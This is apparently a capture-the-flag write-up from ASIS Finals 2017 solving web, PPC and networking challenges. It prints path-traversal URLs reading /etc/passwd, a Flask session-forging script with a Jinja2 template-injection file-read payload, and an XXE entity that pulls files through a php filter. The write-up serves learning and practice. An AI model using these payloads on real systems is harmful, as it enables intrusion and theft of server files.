
# ASIS-FINALS-2017
-<b>Task name : Golem is stupid <br>
-Category : Web <br>
 </b>
-Description :  Golem is an animated anthropomorphic being that is magically created entirely from inanimate matter, but Golem is stupid! <br>
<br>

-tl;dr : SSTI to get RCE in flask session token <br>

-Challenge : <br>
-first could find obvious LFI  https://golem.asisctf.com/article?name=../../../etc/passwd  and leak etc/passwd <br>
-Trying leak other files gave us important infos : https://golem.asisctf.com/article?name=../../../../proc/self/cmdline <br>

https://golem.asisctf.com/article?name=../../../../../../etc/uwsgi/apps-enabled/golem_proj.ini was showing main script path file <br>

leaking that we can see that all parameters are kind of sanitized except token, which was then printed , looks like server side template injection<br>
All I had to do is create local flask app, forge my token using the key which was in the python file with payload, and send it to the application<br><br>

Payload : <br>
```
#creatig payload
from flask import Flask, session

app = Flask(__name__)

@app.route('/')
def run():
    session['golem'] = '{{ \'\'.__class__.__mro__[2].__subclasses__()[40](\'/opt/serverPython/golem/flag.py\').read() }}'
    return 'ok'
    

if __name__ == '__main__':
    app.secret_key = '7h15_5h0uld_b3_r34lly_53cur3d'
    app.run(host='127.0.0.1', port=2222, debug=True)
---------------------------------------------------------------------------------------------------------------------

#exploiting 
import requests

cookies={'session':'.eJwlyU0LgjAYAOC_Eu-5w9SCNugUOJl6iGgub21-QG4Z6Aab-N8zuj7PAv2oWwNkgZ0EAm0y9cwrKyL8kjQNKsJdoXEnBXObyVKj34WmYv-PeRDRacz5hMoUjcxjp7Kr29w3hvt7ptGTYlvEjZOUz0VcT49KWZUN7_x29HWVDvll6DuBzrDuYTYfIIdk_QL3ADJC.DJSUXQ.0_cgqMpbS89-sLEX2HaJRslq73I'}


r=requests.post('https://golem.asisctf.com/golem',cookies=cookies)

print r.text
```

-<br>
-Response contained flag : <b>ASIS{I_L0v3_SerV3r_S1d3_T3mplate_1nj3ct1on!!}</b>

-<br><br>
-<b>------------------------------------------------------------------------------------------------------------------------------------------------------------------</b>
-<br><br><br>
<b>
-Task name :  GSA File Server  <br>
-Category : Web <br>
</b>
-Description :  GSA's file server, go find the hole, drill it and grab the flag :)
-Note that Scope is 128.199.40.185:* <br>
<br>

-tl;dr : Exploit XXE and Use a directory listing vuln to read flag<br>

-Challenge : <br>
-First find :http://128.199.40.185/showFiles was vuln to directory listing<br>
-Second find : http://128.199.40.185:8081/panelManager-0.1/ XXE injection in docx file <br>
-the solution was to download their doc file called (demo) open with archive and change inner xml (word/document.xml) with an xxe  php filter was working <br>
-```<!DOCTYPE roottag [<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=../../../../fileSharing/s3cRetP4th/flagIsHeregRabiT.flag"> ]>```<br>
-<br> the directory of the flag was found using the first vuln <br>
-Flag : <b>ASIS{Vuln_web_appZ_plus_misc0nfig_eQ_dis4st3R!}</b>
-<br><br>
-<b>------------------------------------------------------------------------------------------------------------------------------------------------------------------</b>
-<br><br><br><b>
-Task name :   Chaoyang District   <br>
-Category : PPC <br></b>
-Description :  This is an AI programming challenge, so binary is not required to be provided. <br>
-tl;dr : play one game to generate sequence of winning moves, repeat same sequences 50 times ;) <br>
-Challenge : <br>
-Challenge was Reversi game vs an AI, the problem was that the same game was repeated, and the AI did same moves, so we need to win just one game, store the moves that we used and repeat for all games <br>

```
from pwn import *

nc=remote('178.62.22.245',32145)
seq=['e3','c5','b5','g3','b3','a5','b7','a7','d7','e6','a4','a8','e1','b1','g8','c8','g5','h2','g1','h6','g7','h7','d8','c1','e8','a2','h3','h5']
for z in range(0, 50):
    print "[-]", z
    for i in range(0, len(seq)):

        nc.writeline(seq[i])

nc.interactive()
```

<br>
Flag : <b>ASIS{Th3_Bra1n_Wash1nG_HAHA_AI_IS_INTERESTING}</b>
<br><br>
-<b>------------------------------------------------------------------------------------------------------------------------------------------------------------------</b>
-<br><br><b>
-Task name :   Vivid Spying   <br>
-Category : Networking <br></b>
-Description :      We have captured the spy traffic by our agents, hurry up and find the flag. : <br>
-Challenge : <br> 
-The challenge provided a DNS capture, after analyzing it for a bit we can extract some prefix in a domain name asisctf.com<br>
10.111110100001001111101011001010011100100010001011111010000101100.010111010010110111011101111101011100110011101101001011010011110.000011101100101011111010110111101100101010010010110010101000001.asisctf.com <br>
Cleaning that prefix from dots and reading it right to right didn't give printable string <br>
after adding a zero it becomes : 010000010101001101001001010100110111101101011111010100110111000001111001011010010110111001100111010111110111011101101001011101000110100001011111010001000100111001010011010111110010000101111101 <br>
-bin to ascii => <b>ASIS{_Spying_with_DNS_!} </b>
